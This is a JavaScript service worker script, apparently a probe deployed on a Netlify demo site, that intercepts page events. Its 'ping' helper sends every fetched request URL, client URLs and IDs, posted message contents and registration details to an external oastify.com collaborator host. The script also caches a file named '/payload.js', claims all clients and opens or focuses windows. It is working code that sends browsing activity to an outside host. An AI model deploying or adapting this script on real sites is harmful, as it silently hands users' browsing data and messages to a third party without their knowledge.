  const OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com';
  const ping = (tag, data) => fetch(OOB + '/sw_side/' + tag, {
    method: 'POST', mode: 'no-cors',
    body: JSON.stringify(data ?? {})
  }).catch(err => console.warn('[SW] ping failed:', tag, err.message));

  // ── ExtendableEvent.waitUntil() ─────────────────────────
  self.addEventListener('install', e => {
    ping('extendableEvent.waitUntil', { event: 'install' });
    e.waitUntil(
      caches.open('netlify-demo-v1').then(c => c.addAll(['/payload.js', '/sw.js']))
        .then(() => ping('install.cacheReady', { ok: true }))
        .catch(err => {
          console.error('[SW] install cache failed:', err);
          ping('install.error', { error: err.message });
        })
    );
  });

  // ── skipWaiting() ───────────────────────────────────────
  self.addEventListener('install', e => {
    self.skipWaiting();
    ping('skipWaiting', { called: true });
  });

  // ── clients.claim() ─────────────────────────────────────
  self.addEventListener('activate', e => {
    e.waitUntil(
      clients.claim()
        .then(() => ping('clients.claim', { ok: true }))
        .catch(err => {
          console.error('[SW] clients.claim failed:', err);
          ping('clients.claim.error', { error: err.message });
        })
    );
  });

  // ── clients.matchAll() ─────────────────────────────────
  self.addEventListener('activate', e => {
    e.waitUntil(
      clients.matchAll({ includeUncontrolled: true, type: 'all' }).then(list => {
        ping('clients.matchAll', {
          count: list.length,
          clients: list.map(c => ({ id: c.id, url: c.url, type: c.type, frameType: c.frameType }))
        });
      }).catch(err => {
        console.error('[SW] clients.matchAll failed:', err);
        ping('clients.matchAll.error', { error: err.message });
      })
    );
  });

  // ── FetchEvent ─────────────────────────────────────────
  self.addEventListener('fetch', e => {
    const url = e.request.url;

    // FetchEvent properties
    ping('fetchEvent.props', {
      clientId:          e.clientId,
      resultingClientId: e.resultingClientId,
      replacesClientId:  e.replacesClientId,
      request_url:       url,
      request_method:    e.request.method,
      request_mode:      e.request.mode,
    });

    // preloadResponse
    e.waitUntil(
      Promise.resolve(e.preloadResponse).then(preload => {
        ping('fetchEvent.preloadResponse', { hasPreload: !!preload });
      }).catch(err => {
        console.error('[SW] preloadResponse failed:', err);
        ping('fetchEvent.preloadResponse.error', { error: err.message });
      })
    );

    // handled promise
    e.handled.then(() => ping('fetchEvent.handled', { url })).catch(err => {
      console.warn('[SW] fetchEvent.handled rejected:', url, err.message);
    });

    // respondWith() — serve from cache or network
    e.respondWith(
      caches.match(e.request).then(cached => {
        if (cached) {
          ping('fetchEvent.respondWith', { source: 'cache', url });
          return cached;
        }
        ping('fetchEvent.respondWith', { source: 'network', url });
        return fetch(e.request);
      }).catch(err => {
        console.error('[SW] respondWith failed:', url, err);
        ping('fetchEvent.respondWith.error', { url, error: err.message });
        return new Response('Service Worker error: ' + err.message, {
          status: 502,
          headers: { 'Content-Type': 'text/plain' }
        });
      })
    );
  });

  // ── message event + clients.get() + Client.postMessage() ─
  self.addEventListener('message', async e => {
    try {
      ping('event.message', { data: JSON.stringify(e.data), clientId: e.source?.id });

      // clients.get()
      if (e.source?.id) {
        const client = await clients.get(e.source.id);
        ping('clients.get', { found: !!client, url: client?.url, type: client?.type });

        // Client.postMessage() — reply back
        client?.postMessage({ type: 'sw_reply', echo: e.data });
        ping('client.postMessage', { sent: true, to: client?.url });

        // WindowClient specific
        if (client?.type === 'window') {
          ping('windowClient.focused', { focused: client.focused });
          ping('windowClient.visibilityState', { state: client.visibilityState });
          ping('windowClient.frameType', { frameType: client.frameType });

          // navigate() — only works if page is controlled
          // client.navigate(client.url).then(() => ping('windowClient.navigate', { ok: true })).catch(err =>
  // ping('windowClient.navigate.err', { e: err.message }));

          // focus()
          client.focus().then(() => ping('windowClient.focus', { ok: true })).catch(err => ping('windowClient.focus.err',
  { e: err.message }));
        }
      }

      // clients.openWindow() — demo, opens a new tab
      if (e.data?.type === 'demo_openWindow') {
        const newClient = await clients.openWindow('https://gleeful-creponne-8ff162.netlify.app/');
        ping('clients.openWindow', { opened: newClient?.url });
      }
    } catch (err) {
      console.error('[SW] message handler error:', err);
      ping('message.error', { error: err.message, data: JSON.stringify(e.data) });
    }
  });

  // ── registration properties ────────────────────────────
  self.addEventListener('activate', e => {
    ping('registration.scope', { scope: self.registration.scope });
    ping('registration.updateViaCache', { value: self.registration.updateViaCache });
    ping('registration.active_state', { state: self.registration.active?.state });
  });
